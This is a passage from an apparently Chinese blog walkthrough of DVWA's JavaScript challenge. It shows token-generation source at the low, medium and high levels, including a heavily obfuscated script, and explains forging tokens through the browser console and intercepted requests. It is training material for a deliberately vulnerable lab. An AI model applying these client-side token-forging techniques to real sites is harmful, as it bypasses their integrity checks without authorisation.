class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 猜测generate_token()函数中的 phrase 就是我们要输入的参数，我们要成功提交success</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051875.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>尝试提交 success 提示无效的token</p>
<p><img src="https://img-blog.csdnimg.cn/5f2538ab5d2b4711bd69f6534d713d6d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_13,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>md5(rot13(pahrase)) 对我们输入的参数加密，作为token</p>
<p><a href="https://baike.baidu.com/item/ROT13/7086083?fr=aladdin">ROT13_百度百科</a></p>
<p> F12利用控制台获得加密后的success -&gt; 38581812b435834ebf84ebcc2c6424d6</p>
<p><img src="https://img-blog.csdnimg.cn/e168973c6ee345c390f225a6507881aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们抓包修改token 和phrase</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051434.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>发送数据包，well done!  </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051484.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-11"><a href="#Security-level-is-currently-medium-11" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function do_something(e)&#123;</span><br><span class="line">   for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)</span><br><span class="line">       t+=e[n];return t</span><br><span class="line">   &#125;</span><br><span class="line">   setTimeout(function()&#123;do_elsesomething(&quot;XX&quot;)&#125;,300);</span><br><span class="line">   function do_elsesomething(e)&#123;document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>token生成放在单独的js文件中。最终就是把”XXphrase的值XX”字符串反转作为token。</p>
<p>我们提交验证一下想法 </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051572.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>F12 生成token</p>
<p><img src="https://img-blog.csdnimg.cn/fbcc78c2996b4cd6bd65f6a559fec01f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 修改value，文本框输入success，提交 Well done!</p>
<p><img src="https://img-blog.csdnimg.cn/ee586659e243400ebe551c47886c923c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-11"><a href="#Security-level-is-currently-high-11" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a=[&#x27;fromCharCode&#x27;,&#x27;toString&#x27;,&#x27;replace&#x27;,&#x27;BeJ&#x27;,&#x27;\x5cw+&#x27;,&#x27;Lyg&#x27;,&#x27;SuR&#x27;,&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N)&#123;1R=1O&#125;q\x202L=!1R&amp;&amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;&amp;1c\x202d===\x271n\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o)&#123;Y=3R&#125;z\x20p(2L)&#123;Y=2M&#125;q\x202G=!Y.3Q&amp;&amp;1c\x202g===\x271n\x27&amp;&amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;&amp;2l.3P;q\x201y=!Y.3H&amp;&amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K)&#123;1z.1K=w(1x)&#123;A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27&#125;&#125;p(1y&amp;&amp;(Y.50||!Z.1N))&#123;Z.1N=w(1x)&#123;A\x201c\x201x===\x271n\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z&#125;&#125;q\x202m=w(1X,x)&#123;A\x20w(s)&#123;A\x20O\x20N(x,1d).S(s)[1X]()&#125;&#125;;q\x202a=w(x)&#123;q\x20P=2m(\x271e\x27,x);p(2o)&#123;P=2P(P,x)&#125;P.1T=w()&#123;A\x20O\x20N(x)&#125;;P.S=w(s)&#123;A\x20P.1T().S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2m(T,x)&#125;A\x20P&#125;;q\x202P=w(P,x)&#123;q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s)&#123;p(1c\x20s===\x272p\x27)&#123;A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)&#125;z&#123;p(s===2q||s===2T)&#123;1u\x20O\x201t(1l)&#125;z\x20p(s.1J===Z)&#123;s=O\x202r(s)&#125;&#125;p(1z.1K(s)||Z.1N(s)||s.1J===1Y)&#123;A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)&#125;z&#123;A\x20P(s)&#125;&#125;;A\x202z&#125;;q\x202k=w(1X,x)&#123;A\x20w(G,s)&#123;A\x20O\x201P(G,x,1d).S(s)[1X]()&#125;&#125;;q\x202f=w(x)&#123;q\x20P=2k(\x271e\x27,x);P.1T=w(G)&#123;A\x20O\x201P(G,x)&#125;;P.S=w(G,s)&#123;A\x20P.1T(G).S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2k(T,x)&#125;A\x20P&#125;;w\x20N(x,1v)&#123;p(1v)&#123;l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l&#125;z&#123;k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]&#125;p(x)&#123;k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T&#125;z&#123;k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s&#125;k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x&#125;N.Q.S=w(s)&#123;p(k.1U)&#123;A&#125;q\x202h,T=1c\x20s;p(T!==\x272p\x27)&#123;p(T===\x271n\x27)&#123;p(s===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;s.1J===Z)&#123;s=O\x202r(s)&#125;z\x20p(!1z.1K(s))&#123;p(!1y||!Z.1N(s))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;2h=1d&#125;q\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W)&#123;p(k.1L)&#123;k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;p(2h)&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]&#125;&#125;z&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;r=s.1Q(M);p(r&lt;R)&#123;l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2v)&#123;l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2A||r&gt;=2E)&#123;l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z&#123;r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;&#125;&#125;k.2u=i;k.L+=i-k.1A;p(i&gt;=1k)&#123;k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d&#125;z&#123;k.1A=i&#125;&#125;p(k.L&gt;4r)&#123;k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H&#125;A\x20k&#125;;N.Q.1s=w()&#123;p(k.1U)&#123;A&#125;k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q)&#123;p(!k.1L)&#123;k.1W()&#125;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()&#125;;N.Q.1W=w()&#123;q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j)&#123;v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0&#125;1D=b&amp;c;1g(j=0;j&lt;1k;j+=4)&#123;p(k.2j)&#123;p(k.x)&#123;1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0&#125;z&#123;1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0&#125;k.2j=1O&#125;z&#123;1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0&#125;1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0&#125;k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0&#125;;N.Q.1e=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x)&#123;1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]&#125;A\x201e&#125;;N.Q.2U=N.Q.1e;N.Q.1G=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x)&#123;2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)&#125;A\x202b&#125;;N.Q.27=N.Q.1G;N.Q.2R=w()&#123;k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x)&#123;1i.1p(28,k.D)&#125;A\x201w&#125;;w\x201P(G,x,1v)&#123;q\x20i,T=1c\x20G;p(T===\x272p\x27)&#123;q\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i)&#123;r=G.1Q(i);p(r&lt;R)&#123;L[M++]=r&#125;z\x20p(r&lt;2v)&#123;L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))&#125;z\x20p(r&lt;2A||r&gt;=2E)&#123;L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))&#125;z&#123;r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))&#125;&#125;G=L&#125;z&#123;p(T===\x271n\x27)&#123;p(G===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;G.1J===Z)&#123;G=O\x202r(G)&#125;z\x20p(!1z.1K(G))&#123;p(!1y||!Z.1N(G))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;&#125;p(G.W&gt;1k)&#123;G=(O\x20N(x,1d)).S(G).27()&#125;q\x201F=[],2e=[];1g(i=0;i&lt;1k;++i)&#123;q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b&#125;N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v&#125;1P.Q=O\x20N();1P.Q.1s=w()&#123;N.Q.1s.1I(k);p(k.2c)&#123;k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)&#125;&#125;;q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G)&#123;2g.X=X&#125;z&#123;Y.1q=X.1q;Y.1H=X.1H;p(2s)&#123;2l(w()&#123;A\x20X&#125;)&#125;&#125;&#125;)();w\x202y(e)&#123;1g(q\x20t=\x22\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\x20t&#125;w\x202J(t,y=\x224B\x22)&#123;1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)&#125;w\x202B(e=\x224E\x22)&#123;1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)&#125;w\x202K(a,b)&#123;1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)&#125;1m.1o(\x222F\x22).1r=\x22\x22;4u(w()&#123;2B(\x224M\x22)&#125;,4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);&#x27;,&#x27;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#x27;,&#x27;split&#x27;];(function(c,d)&#123;var e=function(f)&#123;while(--f)&#123;c[&#x27;push&#x27;](c[&#x27;shift&#x27;]());&#125;&#125;;e(++d);&#125;(a,0x1f4));var b=function(c,d)&#123;c=c-0x0;var e=a[c];return e;&#125;;eval(function(d,e,f,g,h,i)&#123;h=function(j)&#123;return(j&lt;e?&#x27;&#x27;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#x27;0x0&#x27;)](j+0x1d):j[b(&#x27;0x1&#x27;)](0x24));&#125;;if(!&#x27;&#x27;[b(&#x27;0x2&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;wpA&#x27;!==b(&#x27;0x3&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;0x5&#x27;)===b(&#x27;0x6&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;0x2&#x27;)](new RegExp(&#x27;\x5cb&#x27;+h(f)+&#x27;\x5cb&#x27;,&#x27;g&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;0x7&#x27;),0x3e,0x137,b(&#x27;0x8&#x27;)[b(&#x27;0x9&#x27;)](&#x27;|&#x27;),0x0,&#123;&#125;));</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 开发用了混淆算法，附上解密网站<a href="http://deobfuscatejavascript.com/"> Deobfuscate Javascript - Deobfuscate malicious Javascripts for quick and easy analysis</a></p>
<p>解密代码：太多了就不上传了，自行解密吧</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051304.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
